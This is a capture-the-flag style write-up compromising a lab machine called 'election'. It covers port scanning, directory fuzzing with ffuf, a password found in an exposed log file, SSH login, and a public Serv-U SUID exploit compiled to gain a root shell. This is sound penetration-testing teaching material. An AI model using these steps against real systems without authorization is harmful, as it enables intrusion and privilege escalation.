## Initial NMAP scan:

```bash
┌──(parallels㉿V35HR4J)-[~]
└─$ nmap 192.168.205.211 -T4 
Starting Nmap 7.92 ( https://nmap.org ) at 2023-12-18 15:36 +0545
Nmap scan report for 192.168.205.211
Host is up (0.17s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 20.12 seconds
```

## Enemurating Port 80:

```bash
┌──(parallels㉿V35HR4J)-[~]
└─$ ffuf -u http://192.168.205.211/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -c -ic

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.205.211/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

                        [Status: 200, Size: 10918, Words: 3499, Lines: 376]
javascript              [Status: 301, Size: 323, Words: 20, Lines: 10]
election                [Status: 301, Size: 321, Words: 20, Lines: 10]
```
`/election` seems interesting, let's dig further, you can vote user from the portal, if you try to vote, you can see the request going through `/election/admin/ajax/pemilihan.php`, we can always try bruteforcing endpoints recursively:

```bash

┌──(parallels㉿V35HR4J)-[~]
└─$ ffuf -u http://192.168.205.211/election/admin/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -c -ic

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.205.211/election/admin/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

img                     [Status: 301, Size: 331, Words: 20, Lines: 10]
                        [Status: 200, Size: 8964, Words: 851, Lines: 130]
plugins                 [Status: 301, Size: 335, Words: 20, Lines: 10]
css                     [Status: 301, Size: 331, Words: 20, Lines: 10]
ajax                    [Status: 301, Size: 332, Words: 20, Lines: 10]
js                      [Status: 301, Size: 330, Words: 20, Lines: 10]
components              [Status: 301, Size: 338, Words: 20, Lines: 10]
inc                     [Status: 301, Size: 331, Words: 20, Lines: 10]
logs                    [Status: 301, Size: 332, Words: 20, Lines: 10]
```

`/logs` seems interesting, checking it out gives us `system.log`

```bash
[2020-01-01 00:00:00] Assigned Password for the user love: P@$$w0rd@123
[2020-04-03 00:13:53] Love added candidate 'Love'.
[2020-04-08 19:26:34] Love has been logged in from Unknown IP on Firefox (Linux).
```

Trying to ssh with the credentials, we can get access as user `love`:

## Privelage Escalation:

Let's enemurate for SUID binaries:

```bash
love@election:~$ find / -perm /4000 2>/dev/null
/usr/bin/arping
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/traceroute6.iputils
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/sbin/pppd
/usr/local/Serv-U/Serv-U
```

since, `/usr/local/Serv-U/Serv-U` is something unique, googling about possible attack vectors a bit leads us to [this](https://www.exploit-db.com/exploits/47009) privilege escilation , let's try it out:

```bash
love@election:/tmp$ gcc exploit.c -o exp
love@election:/tmp$ ./exp
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),116(lpadmin),126(sambashare),1000(love)
opening root shell
# cat `find / -name proof.txt`
b4153718564e088ae08798956b99376e
```

# Takeaways:
- Always enemurate for SUID binaries, they are the quick wins.
- FUZZ ALL THE THINGS!!!!